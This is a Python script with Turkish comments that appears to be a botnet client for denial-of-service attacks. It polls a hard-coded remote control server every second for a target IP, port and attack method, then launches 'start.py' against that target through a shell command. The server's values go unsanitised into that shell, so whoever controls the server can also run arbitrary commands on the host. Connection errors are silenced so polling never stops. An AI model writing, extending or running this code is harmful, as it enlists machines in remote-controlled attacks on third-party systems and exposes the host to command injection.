import requests
import subprocess
import time
import json
import os
from threading import Thread

# Konfigürasyon dosyasını yükle
def load_config():
    default_config = {
        "server_url": "http://walzayza.keenetic.pro:8080/",
        "request_interval": 1,
        "wait_time": 5,
        "request_timeout": 3
    }
    return default_config

# Konfigürasyonu yükle
CONFIG = load_config()

def execute_command(ip, port, method):
    """Komutu çalıştıran fonksiyon"""
    try:
        cmd_string = f"python3 start.py {method} {ip}:{port} 1 30"
        
        print(f"[*] Komut çalıştırılıyor: {cmd_string}")
        
        result = subprocess.run(cmd_string, 
                              shell=True,
                              capture_output=True, 
                              text=True, 
                              timeout=30)
        
        print(f"[+] Komut tamamlandı - IP: {ip}, Port: {port}")
        
        if result.stdout:
            print(f"[+] Çıktı: {result.stdout}")
        
        if result.stderr:
            print(f"[-] Hata: {result.stderr}")
            
    except subprocess.TimeoutExpired:
        print(f"[-] Komut zaman aşımına uğradı - IP: {ip}, Port: {port}")
    except Exception as e:
        print(f"[-] Hata oluştu: {str(e)}")

def send_get_request():
    """Her saniye GET isteği gönderen fonksiyon"""
    while True:
        try:
            # GET isteği gönder
            response = requests.get(
                CONFIG['server_url'], 
                timeout=CONFIG['request_timeout']
            )
            
            if response.status_code == 200:
                try:
                    # JSON yanıtını parse et
                    data = response.json()
                    
                    # IP ve port bilgilerini al
                    if 'ip' in data and 'port' in data:
                        ip = data['ip']
                        port = data['port']
                        method = data['method']
                        
                        print(f"\n[*] Yeni hedef alındı - IP: {ip}, Port: {port}, Method {method}")
                        
                        command_thread = Thread(target=execute_command, args=(ip, port, method))
                        command_thread.daemon = True
                        command_thread.start()

                        print(f"[*] {CONFIG['wait_time']} saniye bekleniyor...")
                        time.sleep(CONFIG['wait_time'])
                        
                except json.JSONDecodeError:
                    print("[-] JSON parse hatası")
                except KeyError:
                    print("[-] JSON'da ip veya port anahtarı bulunamadı")
            else:
                print(f"[-] HTTP {response.status_code} hatası")
                
        except requests.exceptions.Timeout:
            pass  # Sessizce devam et
        except requests.exceptions.ConnectionError:
            pass  # Sessizce devam et
        except Exception as e:
            print(f"[-] Beklenmeyen hata: {str(e)}")
        
        # Belirtilen aralıkta bekle
        time.sleep(CONFIG['request_interval'])

def main():
    """Ana fonksiyon"""
    print("[*] Program başlatılıyor...")
    print(f"[*] Sunucu URL: {CONFIG['server_url']}")
    print(f"[*] İstek aralığı: {CONFIG['request_interval']} saniye")
    print(f"[*] Bekleme süresi: {CONFIG['wait_time']} saniye\n")
    
    try:
        send_get_request()
    except KeyboardInterrupt:
        print("\n[!] Program sonlandırılıyor...")

if __name__ == "__main__":
    main()
